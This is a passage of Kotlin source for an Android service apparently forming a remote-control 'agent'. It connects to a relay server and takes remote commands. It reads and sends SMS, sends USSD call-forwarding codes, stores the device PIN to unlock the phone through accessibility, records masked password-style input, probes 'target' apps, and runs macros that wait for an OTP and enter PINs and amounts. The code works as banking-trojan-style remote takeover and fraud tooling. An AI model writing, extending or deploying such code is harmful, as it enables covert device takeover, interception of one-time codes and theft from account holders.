package com.acme.rc.agent

import android.app.KeyguardManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Base64
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.app.ServiceCompat
import com.acme.rc.MainActivity
import com.acme.rc.accessibility.RcAccessibilityService
import com.acme.rc.admin.RcDeviceAdminReceiver
import com.acme.rc.device.AppUnlockStore
import com.acme.rc.device.DevicePin
import com.acme.rc.device.DevicePower
import com.acme.rc.device.DeviceStateReader
import com.acme.rc.device.EnrollUnlockActivity
import com.acme.rc.device.PinKeypadStore
import com.acme.rc.device.UnlockActivity
import com.acme.rc.device.UnlockBridge
import com.acme.rc.device.UnlockEnrollment
import com.acme.rc.inventory.AppInventory
import com.acme.rc.model.AppInfo
import com.acme.rc.model.Element
import com.acme.rc.model.ProbeResult
import com.acme.rc.model.Selector
import com.acme.rc.model.Snapshot
import com.acme.rc.model.TargetApps
import com.acme.rc.otp.OtpBuffer
import com.acme.rc.telephony.TelephonyRepository
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.io.ByteArrayOutputStream
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlin.math.min

class AgentService : Service() {

    companion object {
        private const val TAG = "RcAgentService"
        const val ACTION_STOP = "com.acme.rc.agent.STOP"
        const val ACTION_SEND_PROFILE = "com.acme.rc.agent.SEND_PROFILE"
        const val ACTION_RECONNECT = "com.acme.rc.agent.RECONNECT"
        private const val CHANNEL_ID = "rc_agent"
        private const val NOTIFICATION_ID = 41
        private const val MASK_CHARS = "•●○◦∙·⋅▪▫■□◆◇‣⁃⦁⦿⊙◉*"

        @Volatile
        var instance: AgentService? = null
            private set

        @Volatile
        var recording: Boolean = false
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val commandMutex = Mutex()
    private val mainHandler = Handler(Looper.getMainLooper())

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .pingInterval(20, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()
    }

    @Volatile
    private var socket: WebSocket? = null

    /**
     * Identifies the active socket. Callbacks from an older socket (closed by a
     * reconnect) must not report state or schedule another reconnect, otherwise
     * each reconnect would close the fresh connection and flap forever.
     */
    private val connectionSerial = AtomicInteger(0)

    @Volatile
    private var shouldReconnect = false

    @Volatile
    private var lastSnapshot: Snapshot? = null

    private val lastTexts = mutableMapOf<String, String>()
    private val maskedTyped = mutableMapOf<String, String>()
    private val maskedVisible = mutableMapOf<String, String>()
    private val cancelledRuns = mutableSetOf<String>()
    private val promptDeferred = mutableMapOf<String, CompletableDeferred<String>>()
    private val runVars = mutableMapOf<String, String>()
    private var currentRunId: String? = null
    private var currentSessionId: String? = null
    private var recordAppPackage: String? = null
    private var appEntered = false

    private var reconnectAttempt = 0
    private var reconnectJob: Job? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        createChannel()
        startForegroundCompat("Starting…")
        AgentConnection.serverUrl = AgentConfig.serverUrl()
        AgentConnection.deviceId = AgentConfig.deviceId(this)

        // Keep the admin panel's accessibility/state view current even when the
        // user changes permissions after the agent connected.
        scope.launch {
            while (true) {
                delay(10_000)
                if (AgentConnection.connected) socket?.let { sendState(it) }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_SEND_PROFILE) {
            sendProfile()
            return START_STICKY
        }

        if (intent?.action == ACTION_STOP) {
            shouldReconnect = false
            recording = false
            stopSelf()
            return START_NOT_STICKY
        }

        val url = AgentConfig.serverUrl()
        AgentConnection.serverUrl = url
        AgentConnection.deviceId = AgentConfig.deviceId(this)

        // Opening the app or saving a profile starts the service again. Do not
        // tear down a live socket unless the operator explicitly reconnects.
        val forceReconnect = intent?.action == ACTION_RECONNECT
        if (!forceReconnect && AgentConnection.connected && socket != null) {
            return START_STICKY
        }

        AgentConnection.status = "Connecting to $url…"
        shouldReconnect = true
        connect(url)
        return START_STICKY
    }

    override fun onDestroy() {
        shouldReconnect = false
        recording = false
        instance = null
        currentSessionId = null
        recordAppPackage = null
        appEntered = false
        reconnectJob?.cancel()
        connectionSerial.incrementAndGet()
        val previous = socket
        socket = null
        previous?.close(1000, "service stopped")
        scope.cancel()
        AgentConnection.connected = false
        AgentConnection.status = "Stopped"
        super.onDestroy()
    }

    // -----------------------------------------------------------------
    // Connection
    // -----------------------------------------------------------------

    private fun connect(url: String) {
        reconnectJob?.cancel()
        val serial = connectionSerial.incrementAndGet()

        val previous = socket
        socket = null
        previous?.close(1000, "reconnect")

        AgentConnection.status = "Connecting to $url…"
        val request = Request.Builder().url(url).build()
        socket = client.newWebSocket(request, Listener(serial))
    }

    private fun scheduleReconnect() {
        if (!shouldReconnect) return
        reconnectJob?.cancel()
        val delayMs = min(30_000L, 1_000L * (1 shl min(reconnectAttempt, 4)))
        reconnectAttempt++
        AgentConnection.connected = false
        AgentConnection.status = "Reconnecting in ${delayMs / 1000}s…"
        reconnectJob = scope.launch {
            delay(delayMs)
            if (shouldReconnect) connect(AgentConfig.serverUrl())
        }
    }

    private inner class Listener(private val serial: Int) : WebSocketListener() {
        private fun isCurrent(): Boolean = serial == connectionSerial.get()

        override fun onOpen(webSocket: WebSocket, response: Response) {
            if (!isCurrent()) {
                webSocket.close(1000, "stale")
                return
            }
            reconnectAttempt = 0
            AgentConnection.connected = true
            AgentConnection.status = "Connected"
            updateNotification("Connected to relay")
            sendHello(webSocket)
            scope.launch {
                sendApps(webSocket)
                sendState(webSocket)
                sendTelephony()
                sendProfile()
            }
        }

        override fun onMessage(webSocket: WebSocket, text: String) {
            if (!isCurrent()) return
            try {
                handleMessage(JSONObject(text))
            } catch (t: Throwable) {
                Log.w(TAG, "bad message", t)
            }
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            if (!isCurrent()) return
            AgentConnection.connected = false
            AgentConnection.status = "Connection failed: ${t.message ?: t.javaClass.simpleName}"
            updateNotification("Disconnected")
            scheduleReconnect()
        }

        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            if (!isCurrent()) return
            AgentConnection.connected = false
            AgentConnection.status = "Disconnected: $reason"
            updateNotification("Disconnected")
            scheduleReconnect()
        }
    }

    private fun sendHello(ws: WebSocket) {
        val hello = JSONObject()
            .put("t", "hello")
            .put("role", "device")
            .put("token", com.acme.rc.BuildConfig.DEVICE_TOKEN)
            .put("deviceId", AgentConfig.deviceId(this))
            .put("name", AgentConfig.deviceName())
            .put("model", Build.MODEL)
            .put("android", Build.VERSION.SDK_INT)
            .put("agent", "1.1.0")
            .put("protocolVersion", 1)
        ws.send(hello.toString())
    }

    private suspend fun sendApps(ws: WebSocket) {
        try {
            val apps = AppInventory.list(this)
            val array = JSONArray()
            for (app in apps) array.put(appJson(app))
            ws.send(JSONObject().put("t", "apps").put("apps", array).toString())
        } catch (t: Throwable) {
            Log.w(TAG, "sendApps", t)
        }
    }

    private fun sendState(ws: WebSocket) {
        try {
            val state = DeviceStateReader.read(this)
            val service = RcAccessibilityService.instance
            ws.send(
                JSONObject()
                    .put("t", "state")
                    .put(
                        "state",
                        JSONObject()
                            .put("online", true)
                            .put("screenOn", state.screenOn)
                            .put("locked", state.locked)
                            .put("secureLock", state.secureLock)
                            .put("battery", state.batteryPercent)
                            .put("charging", state.charging)
                            .put("a11y", state.accessibilityEnabled)
                            .put("notifAccess", state.notificationAccess)
                            .put("deviceOwner", state.deviceOwner)
                            .put("stayAwake", state.stayAwake)
                            .put("devicePin", state.devicePin)
                            .put("pinFallback", state.pinFallback)
                            .put("appUnlockPackages", JSONArray(state.appUnlockPackages))
                            .put("package", service?.currentPackage ?: JSONObject.NULL)
                    )
                    .toString()
            )
        } catch (t: Throwable) {
            Log.w(TAG, "sendState", t)
        }
    }

    /** Push the current device state after a local credential change. */
    fun refreshState() {
        socket?.let { sendState(it) }
    }

    // -----------------------------------------------------------------
    // Commands
    // -----------------------------------------------------------------

    private fun handleMessage(msg: JSONObject) {
        when (msg.optString("t")) {
            "helloOk" -> {
                val id = msg.optString("deviceId")
                if (id.isNotBlank()) AgentConnection.deviceId = id
            }
            "cmd" -> handleCommand(msg)
            else -> Unit
        }
    }

    private fun handleCommand(msg: JSONObject) {
        val action = msg.optString("action")
        val cmdId = msg.optString("cmdId")

        // These must not wait behind a long macro run.
        when (action) {
            "cancelRun" -> {
                cancelledRuns.add(msg.optString("runId"))
                sendResult(cmdId, true)
                return
            }
            "startRecording" -> {
                recording = true
                currentSessionId = msg.optString("sessionId").takeIf { it.isNotBlank() }
                recordAppPackage = msg.optString("appPackage").takeIf { it.isNotBlank() }
                appEntered = recordAppPackage?.let { target ->
                    RcAccessibilityService.instance?.currentPackage?.let {
                        relatedPackage(it, target)
                    } == true
                } ?: false
                lastTexts.clear()
                maskedTyped.clear()
                maskedVisible.clear()
                sendRecordingState(true, currentSessionId)
                sendResult(cmdId, true)
                return
            }
            "stopRecording" -> {
                val sessionId = currentSessionId
                recording = false
                currentSessionId = null
                recordAppPackage = null
                appEntered = false
                sendRecordingState(false, sessionId)
                sendResult(cmdId, true)
                return
            }
            "promptResult" -> {
                val promptId = msg.optString("promptId")
                promptDeferred.remove(promptId)?.complete(msg.optString("value"))
                sendResult(cmdId, true)
                return
            }
            "setDevicePin" -> {
                scope.launch {
                    val pin = msg.optString("pin")
                    if (!DevicePin.isValid(pin)) {
                        sendResult(
                            cmdId,
                            false,
                            "PIN or password must be ${DevicePin.MIN_LENGTH}–" +
                                "${DevicePin.MAX_LENGTH} characters"
                        )
                        return@launch
                    }
                    try {
                        DevicePin.save(this@AgentService, pin)
                        DevicePin.setAllowCachedKeypad(
                            this@AgentService,
                            msg.optBoolean("fallback", false)
                        )
                        sendResult(cmdId, true, null, "Device PIN stored on the device")
                        UnlockEnrollment.cancel(this@AgentService)
                        socket?.let { sendState(it) }
                    } catch (t: Throwable) {
                        Log.w(TAG, "setDevicePin", t)
                        sendResult(
                            cmdId,
                            false,
                            "Could not store the PIN: ${describeError(t)}"
                        )
                    }
                }
                return
            }
            "clearDevicePin" -> {
                scope.launch {
                    try {
                        DevicePin.clear(this@AgentService)
                        PinKeypadStore.clear(this@AgentService)
                        UnlockEnrollment.reset(this@AgentService)
                        sendResult(cmdId, true, null, "Device PIN removed")
                        socket?.let { sendState(it) }
                    } catch (t: Throwable) {
                        sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
                    }
                }
                return
            }
            "openEnrollment" -> {
                scope.launch {
                    try {
                        DevicePower.wake(this@AgentService)
                        val keyguard = getSystemService(KeyguardManager::class.java)
                        if (keyguard?.isKeyguardLocked == true) {
                            val detail =
                                "Device is locked. Unlock it on the device, then retry."
                            sendResult(cmdId, false, detail, detail)
                            return@launch
                        }
                        startActivity(
                            Intent(this@AgentService, EnrollUnlockActivity::class.java)
                                .addFlags(
                                    Intent.FLAG_ACTIVITY_NEW_TASK or
                                        Intent.FLAG_ACTIVITY_CLEAR_TOP
                                )
                        )
                        sendResult(
                            cmdId,
                            true,
                            null,
                            "Enrollment screen opened on the device"
                        )
                    } catch (t: Throwable) {
                        sendResult(
                            cmdId,
                            false,
                            "Could not open enrollment: ${describeError(t)}"
                        )
                    }
                }
                return
            }
            "setAppUnlock" -> {
                scope.launch {
                    val pkg = msg.optString("package")
                    val secret = msg.optString("secret")
                    if (pkg.isBlank()) {
                        sendResult(cmdId, false, "App package is required")
                        return@launch
                    }
                    if (!AppUnlockStore.isValid(secret)) {
                        sendResult(
                            cmdId,
                            false,
                            "Credential must be ${DevicePin.MIN_LENGTH}–" +
                                "${DevicePin.MAX_LENGTH} characters"
                        )
                        return@launch
                    }
                    try {
                        AppUnlockStore.save(this@AgentService, pkg, secret)
                        sendResult(cmdId, true, null, "App credential stored for $pkg")
                        socket?.let { sendState(it) }
                    } catch (t: Throwable) {
                        Log.w(TAG, "setAppUnlock", t)
                        sendResult(
                            cmdId,
                            false,
                            "Could not store the app credential: ${describeError(t)}"
                        )
                    }
                }
                return
            }
            "clearAppUnlock" -> {
                scope.launch {
                    val pkg = msg.optString("package")
                    if (pkg.isBlank()) {
                        sendResult(cmdId, false, "App package is required")
                        return@launch
                    }
                    try {
                        AppUnlockStore.clear(this@AgentService, pkg)
                        sendResult(cmdId, true, null, "App credential removed for $pkg")
                        socket?.let { sendState(it) }
                    } catch (t: Throwable) {
                        sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
                    }
                }
                return
            }
            "telephonyInfo" -> {
                scope.launch {
                    try {
                        sendTelephony()
                        sendResult(cmdId, true)
                    } catch (t: Throwable) {
                        sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
                    }
                }
                return
            }
            "smsList" -> {
                scope.launch {
                    try {
                        sendSmsList(msg.optInt("limit", 50))
                        sendResult(cmdId, true)
                    } catch (t: Throwable) {
                        sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
                    }
                }
                return
            }
            "smsSend" -> {
                scope.launch {
                    val to = msg.optString("to")
                    try {
                        val detail = TelephonyRepository.sendSms(
                            this@AgentService,
                            to,
                            msg.optString("body"),
                            msg.optInt("subId", -1)
                        )
                        sendSmsSendResult(true, to, null, detail)
                        sendResult(cmdId, true, null, detail)
                    } catch (t: Throwable) {
                        val error = t.message ?: t.javaClass.simpleName
                        sendSmsSendResult(false, to, error, null)
                        sendResult(cmdId, false, error)
                    }
                }
                return
            }
            "wake" -> {
                scope.launch {
                    try {
                        val detail = DevicePower.wake(this@AgentService)
                        sendResult(cmdId, true, null, detail)
                        delay(700)
                        captureAndSend()
                    } catch (t: Throwable) {
                        sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
                    }
                }
                return
            }
            "unlock" -> {
                scope.launch {
                    val done = AtomicBoolean(false)
                    fun finish(ok: Boolean, detail: String) {
                        if (!done.compareAndSet(false, true)) return
                        UnlockBridge.clear()
                        sendResult(cmdId, ok, if (ok) null else detail, detail)
                        if (ok) {
                            scope.launch {
                                delay(700)
                                captureAndSend()
                            }
                        }
                    }
                    try {
                        DevicePower.wake(this@AgentService)
                        delay(200)
                        val keyguard = getSystemService(KeyguardManager::class.java)
                        if (keyguard?.isKeyguardLocked != true) {
                            finish(true, "Device is already unlocked")
                            return@launch
                        }

                        // A secure lock cannot be dismissed, only entered. Use
                        // the device-local PIN/password through accessibility.
                        if (keyguard.isDeviceSecure) {
                            val pin = DevicePin.read(this@AgentService)
                            if (pin != null) {
                                val service = RcAccessibilityService.instance
                                if (service == null) {
                                    finish(
                                        false,
                                        "Device PIN/password is stored, but the accessibility " +
                                            "service is not connected."
                                    )
                                    return@launch
                                }
                                val result = service.unlockWithCredential(
                                    pin,
                                    DevicePin.allowCachedKeypad(this@AgentService)
                                )
                                finish(result.ok, result.detail)
                                return@launch
                            }
                        }

                        UnlockBridge.register { ok, detail -> finish(ok, detail) }
                        try {
                            startActivity(
                                Intent(this@AgentService, UnlockActivity::class.java)
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            )
                        } catch (t: Throwable) {
                            val dpm = getSystemService(DevicePolicyManager::class.java)
                            val owner = dpm?.isDeviceOwnerApp(packageName) == true
                            val secure = keyguard.isDeviceSecure
                            if (owner && !secure) {
                                val admin = ComponentName(
                                    this@AgentService,
                                    RcDeviceAdminReceiver::class.java
                                )
                                dpm?.setKeyguardDisabled(admin, true)
                                delay(600)
                                finish(true, "Keyguard disabled by Device Owner")
                            } else {
                                finish(
                                    false,
                                    "Could not open the unlock screen. " +
                                        "Set the screen lock to None/Swipe, or unlock on the device."
                                )
                            }
                            return@launch
                        }
                        delay(30_000)
                        finish(
                            false,
                            if (keyguard.isDeviceSecure) {
                                "No device PIN/password stored. Enter it on the device."
                            } else {
                                "Timed out. Enter the PIN/pattern on the device."
                            }
                        )
                    } catch (t: Throwable) {
                        finish(false, t.message ?: t.javaClass.simpleName)
                    }
                }
                return
            }
            "appUnlock" -> {
                scope.launch {
                    try {
                        val service = RcAccessibilityService.instance
                            ?: error("Accessibility service is not connected")
                        val target = msg.optString("package").takeIf { it.isNotBlank() }
                        val result = service.unlockApp(target)
                        sendResult(
                            cmdId,
                            result.ok,
                            if (result.ok) null else result.detail,
                            result.detail
                        )
                        delay(if (result.ok) 700 else 400)
                        captureAndSend()
                    } catch (t: Throwable) {
                        sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
                    }
                }
                return
            }
            "callForward" -> {
                scope.launch {
                    val code = msg.optString("code")
                    val answered = AtomicBoolean(false)
                    fun finish(ok: Boolean, detail: String) {
                        if (!answered.compareAndSet(false, true)) return
                        sendUssdResult(ok, code, detail)
                        sendResult(cmdId, ok, if (ok) null else detail, detail)
                    }
                    try {
                        TelephonyRepository.sendUssd(
                            this@AgentService,
                            code,
                            msg.optInt("subId", -1)
                        ) { ok, detail -> finish(ok, detail) }
                    } catch (t: Throwable) {
                        finish(false, t.message ?: t.javaClass.simpleName)
                        return@launch
                    }
                    delay(20_000)
                    finish(false, "No USSD response from the carrier")
                }
                return
            }
        }

        scope.launch {
            commandMutex.withLock {
                try {
                    when (action) {
                        "listApps" -> sendAppsNow()
                        "snapshot" -> captureAndSend()
                        "launch" -> {
                            val pkg = msg.optString("pkg")
                            val service = service()
                            if (!service.launchApp(pkg)) error("launch failed: $pkg")
                            delay(1500)
                            service.awaitPackage(pkg, 5000)
                            delay(800)
                            captureAndSend()
                        }
                        "tap" -> {
                            val element = findElement(msg) ?: error("element not found")
                            service().tapElement(element)
                            delay(900)
                            captureAndSend()
                        }
                        "tapXY" -> {
                            val x = msg.optDouble("x", -1.0)
                            val y = msg.optDouble("y", -1.0)
                            if (x < 0 || y < 0) error("bad coordinates")
                            val metrics = resources.displayMetrics
                            service().tapAt(
                                (x * metrics.widthPixels).toInt(),
                                (y * metrics.heightPixels).toInt()
                            )
                            delay(900)
                            captureAndSend()
                        }
                        "setText" -> {
                            val element = findElement(msg) ?: error("element not found")
                            val text = msg.optString("text")
                            if (!service().setText(element, text)) error("setText failed")
                            delay(500)
                            captureAndSend()
                        }
                        "inputText" -> {
                            val text = msg.optString("text")
                            val submit = msg.optBoolean("submit", false)
                            if (!service().inputText(text, submit)) {
                                error("no focused text field")
                            }
                            delay(if (submit) 900 else 500)
                            captureAndSend()
                        }
                        "scroll" -> {
                            val element = findElement(msg) ?: error("element not found")
                            val down = msg.optString("dir", "down") == "down"
                            service().scroll(element, down)
                            delay(600)
                            captureAndSend()
                        }
                        "globalAction" -> {
                            val name = msg.optString("name")
                            if (!service().performGlobalActionByName(name)) {
                                error("global action failed: $name")
                            }
                            delay(600)
                            captureAndSend()
                        }
                        "probe" -> {
                            val pkg = msg.optString("pkg")
                            val result = service().probe(pkg)
                            sendProbe(result)
                            delay(400)
                            captureAndSend()
                        }
                        "probeTargets" -> {
                            val service = service()
                            val apps = AppInventory.list(this@AgentService)
                            val targets = apps.filter { TargetApps.isTarget(it.packageName) }
                            for ((index, app) in targets.withIndex()) {
                                AgentConnection.status =
                                    "Probing ${app.label} (${index + 1}/${targets.size})…"
                                sendProbe(service.probe(app.packageName))
                            }
                            captureAndSend()
                        }
                        "runMacro" -> {
                            val runId = msg.optString("runId")
                            val macro = msg.optJSONObject("macro")
                                ?: error("macro missing")
                            val params = msg.optJSONObject("params") ?: JSONObject()
                            runMacro(runId, macro, params)
                        }
                        else -> error("unknown action: $action")
                    }
                    sendResult(cmdId, true)
                } catch (t: Throwable) {
                    sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
                }
            }
        }
    }

    private fun service(): RcAccessibilityService =
        RcAccessibilityService.instance
            ?: error("accessibility service not enabled")

    private fun findElement(msg: JSONObject): Element? {
        val snapshot = lastSnapshot ?: return null
        val id = msg.optString("element")
        val index = msg.optInt("index", -1)
        return snapshot.elements.firstOrNull { it.id == id }
            ?: snapshot.elements.firstOrNull { it.index == index }
    }

    private suspend fun sendAppsNow() {
        val ws = socket ?: return
        sendApps(ws)
    }

    private suspend fun captureAndSend() {
        val snapshot = service().captureSnapshot()
        lastSnapshot = snapshot
        socket?.send(snapshotJson(snapshot).toString())
        socket?.let { sendState(it) }
    }

    private fun sendResult(
        cmdId: String,
        ok: Boolean,
        error: String? = null,
        detail: String? = null
    ) {
        val json = JSONObject()
            .put("t", "actionResult")
            .put("cmdId", cmdId)
            .put("ok", ok)
        if (error != null) json.put("error", error)
        if (detail != null) json.put("detail", detail)
        socket?.send(json.toString())
    }

    private fun describeError(t: Throwable): String {
        val parts = mutableListOf<String>()
        var current: Throwable? = t
        var depth = 0
        while (current != null && depth < 4) {
            current.javaClass.simpleName
                .takeIf { it.isNotBlank() && it !in parts }
                ?.let { parts += it }
            current.message
                ?.trim()
                ?.takeIf { it.isNotBlank() && it !in parts }
                ?.let { parts += it }
            current = current.cause
            depth++
        }
        return if (parts.isEmpty()) "unknown error" else parts.joinToString(": ")
    }

    private fun sendProfile() {
        val ws = socket ?: return
        val profile = AgentConfig.profileJson(this) ?: return
        ws.send(JSONObject().put("t", "profile").put("profile", profile).toString())
    }

    private fun sendTelephony() {
        val ws = socket ?: return
        val payload = TelephonyRepository.telephonyJson(this)
        ws.send(payload.put("t", "telephony").toString())
    }

    /**
     * Called by the SMS receiver after a new message is stored. A short delay
     * lets the telephony provider commit the row before we read the inbox.
     */
    fun refreshSmsInbox() {
        scope.launch {
            delay(700)
            sendSmsList(50)
        }
    }

    private fun sendSmsList(limit: Int) {
        val ws = socket ?: return
        val payload = TelephonyRepository.smsJson(this, limit)
        ws.send(payload.put("t", "smsList").toString())
    }

    private fun sendSmsSendResult(
        ok: Boolean,
        to: String,
        error: String?,
        detail: String?
    ) {
        val payload = JSONObject()
            .put("t", "smsSendResult")
            .put("ok", ok)
            .put("to", to)
        if (error != null) payload.put("error", error)
        if (detail != null) payload.put("detail", detail)
        socket?.send(payload.toString())
    }

    private fun sendUssdResult(ok: Boolean, code: String, detail: String) {
        val payload = JSONObject()
            .put("t", "ussdResult")
            .put("ok", ok)
            .put("code", code)
        if (ok) payload.put("response", detail) else payload.put("error", detail)
        socket?.send(payload.toString())
    }

    private fun sendProbe(result: ProbeResult) {
        val payload = JSONObject()
            .put("pkg", result.packageName)
            .put("verdict", result.verdict)
            .put("screenshotOk", result.screenshotOk)
            .put("secureWindow", result.secureWindow)
            .put("nodeCount", result.nodeCount)
            .put("clickableCount", result.clickableCount)
            .put("viewIdCount", result.viewIdCount)
            .put("depth", result.depth)
            .put("elapsedMs", result.elapsedMs)
            .put("error", result.error ?: JSONObject.NULL)
            .put("probedAt", result.probedAt)
        socket?.send(JSONObject().put("t", "probe").put("result", payload).toString())
    }

    // -----------------------------------------------------------------
    // Macro engine
    // -----------------------------------------------------------------

    private data class Step(
        val op: String,
        val pkg: String?,
        val selector: Selector?,
        val selectors: List<Selector>?,
        val text: String?,
        val timeoutMs: Long,
        val expect: Selector?,
        val optional: Boolean,
        val dir: String?,
        val name: String?,
        val label: String?,
        val ms: Long,
        val secretRef: String?,
        val secret: Boolean,
        val submit: Boolean,
        val pinMethod: String,
        val requireActivity: String?
    )

    private data class StepResult(
        val status: String,
        val error: String? = null,
        val detail: String? = null
    )

    private suspend fun runMacro(runId: String, macro: JSONObject, params: JSONObject) {
        runVars.clear()
        currentRunId = runId
        val macroId = macro.optString("id")
        val macroName = macro.optString("name", "macro")
        val stepsJson = macro.optJSONArray("steps") ?: JSONArray()
        val steps = mutableListOf<Step>()
        for (i in 0 until stepsJson.length()) {
            steps.add(parseStep(stepsJson.optJSONObject(i), params))
        }

        val startedAt = System.currentTimeMillis()
        socket?.send(
            JSONObject()
                .put("t", "runStarted")
                .put("runId", runId)
                .put("macroId", macroId)
                .put("macroName", macroName)
                .put("startedAt", startedAt)
                .toString()
        )

        var status = "success"
        var cancelled = false

        for ((index, step) in steps.withIndex()) {
            if (cancelledRuns.remove(runId)) {
                cancelled = true
                break
            }

            val stepStarted = SystemClock.elapsedRealtime()
            var stepStatus = "ok"
            var error: String? = null
            var stepDetail: String? = null
            var snapshot: Snapshot? = null

            try {
                val result = executeStep(step, params)
                if (result.status == "failed" && step.optional) {
                    stepStatus = "skipped"
                    error = null
                } else {
                    stepStatus = result.status
                    error = result.error
                    stepDetail = result.detail
                    when (result.status) {
                        "failed" -> status = "failed"
                        "unverified" -> if (status == "success") status = "unverified"
                    }
                }
                if (stepStatus != "skipped") {
                    snapshot = captureForReport(step)
                }
            } catch (t: Throwable) {
                if (step.optional) {
                    stepStatus = "skipped"
                } else {
                    stepStatus = "failed"
                    error = t.message ?: t.javaClass.simpleName
                    status = "failed"
                    try {
                        snapshot = service().captureSnapshot()
                    } catch (_: Throwable) {
                        // Keep the report even if the final screenshot fails.
                    }
                }
            }

            sendRunStep(
                runId = runId,
                index = index,
                step = step,
                status = stepStatus,
                ms = SystemClock.elapsedRealtime() - stepStarted,
                error = error,
                detail = stepDetail,
                snapshot = snapshot
            )

            if (stepStatus == "failed") break
        }

        if (cancelled || cancelledRuns.remove(runId)) status = "cancelled"

        socket?.send(
            JSONObject()
                .put("t", "runFinished")
                .put("runId", runId)
                .put("status", status)
                .put("finishedAt", System.currentTimeMillis())
                .toString()
        )
        currentRunId = null
        runVars.clear()
    }

    private suspend fun executeStep(step: Step, params: JSONObject): StepResult {
        val service = service()
        var stepDetail: String? = null

        when (step.op) {
            "launch" -> {
                val pkg = step.pkg ?: return StepResult("failed", "launch requires package")
                if (!service.launchApp(pkg)) return StepResult("failed", "launch failed: $pkg")
                delay(1500)
                service.awaitPackage(pkg, 5000)
                delay(800)
            }
            "appUnlock" -> {
                val pkg = step.pkg
                    ?: return StepResult("failed", "appUnlock requires package")
                val result = service.unlockApp(pkg)
                if (!result.ok) return StepResult("failed", result.detail)
                delay(800)
            }
            "waitFor" -> {
                val selector = step.selector
                    ?: return StepResult("failed", "waitFor requires selector")
                if (!waitForSelector(service, selector, step.timeoutMs)) {
                    return StepResult("failed", "timeout waiting for selector")
                }
            }
            "waitForFirst" -> {
                val selectors = step.selectors
                if (selectors.isNullOrEmpty()) {
                    return StepResult("failed", "waitForFirst requires selectors")
                }
                val timeout = if (step.timeoutMs > 0) step.timeoutMs else 5_000L
                val deadline = SystemClock.elapsedRealtime() + timeout
                var match = selectors.firstOrNull { service.exists(it) }
                while (match == null && SystemClock.elapsedRealtime() < deadline) {
                    delay(250)
                    match = selectors.firstOrNull { service.exists(it) }
                }
                if (match == null) {
                    return StepResult(
                        "failed",
                        "none of the waitForFirst selectors appeared"
                    )
                }
            }
            "waitForIdle" -> delay(500)
            "waitForOtp" -> {
                val timeout = if (step.timeoutMs > 0) step.timeoutMs else 60_000L
                val code = awaitOtp(timeout)
                    ?: return StepResult("failed", "OTP not received")
                runVars["otp"] = code
            }
            "tap" -> {
                val selector = step.selector
                    ?: return StepResult("failed", "tap requires selector")
                if (!service.tapSelector(selector)) return StepResult("failed", "tap failed")
                delay(600)
            }
            "tapIfExists" -> {
                val selector = step.selector
                    ?: return StepResult("failed", "tapIfExists requires selector")
                if (!service.exists(selector)) return StepResult("skipped")
                if (!service.tapSelector(selector)) return StepResult("failed", "tap failed")
                delay(600)
            }
            "tapFirst" -> {
                val selectors = step.selectors
                if (selectors.isNullOrEmpty()) {
                    return StepResult("failed", "tapFirst requires selectors")
                }
                val timeout = if (step.timeoutMs > 0) step.timeoutMs else 5_000L
                val deadline = SystemClock.elapsedRealtime() + timeout
                var match = selectors.firstOrNull { service.exists(it) }
                while (match == null && SystemClock.elapsedRealtime() < deadline) {
                    delay(250)
                    match = selectors.firstOrNull { service.exists(it) }
                }
                if (match == null) {
                    return StepResult(
                        "failed",
                        "none of the tapFirst selectors appeared"
                    )
                }
                if (!service.tapSelector(match)) {
                    return StepResult("failed", "tap failed")
                }
                delay(600)
            }
            "setText" -> {
                val selector = step.selector
                    ?: return StepResult("failed", "setText requires selector")
                val text = resolve(step.text, params) ?: ""
                if (!service.setTextSelector(selector, text)) {
                    return StepResult("failed", "setText failed")
                }
                delay(500)
            }
            "enterPin" -> {
                val secret = resolve(step.text, params)
                if (secret.isNullOrBlank()) {
                    return StepResult("failed", "enterPin requires text or secretRef")
                }
                val pinResult = service.enterPin(
                    secret,
                    step.selector,
                    step.submit,
                    step.pinMethod,
                    requireActivity = step.requireActivity
                )
                if (!pinResult.ok) {
                    return StepResult("failed", pinResult.detail)
                }
                stepDetail = pinResult.detail
                delay(600)
            }
            "enterDigits" -> {
                val text = resolve(step.text, params)
                if (text.isNullOrBlank()) {
                    return StepResult("failed", "enterDigits requires text")
                }
                if (!text.all { it.isDigit() }) {
                    return StepResult(
                        "failed",
                        "enterDigits supports whole numbers only"
                    )
                }
                val result = service.enterPin(
                    text,
                    step.selector,
                    submit = false,
                    pinMethod = step.pinMethod,
                    purpose = "Amount",
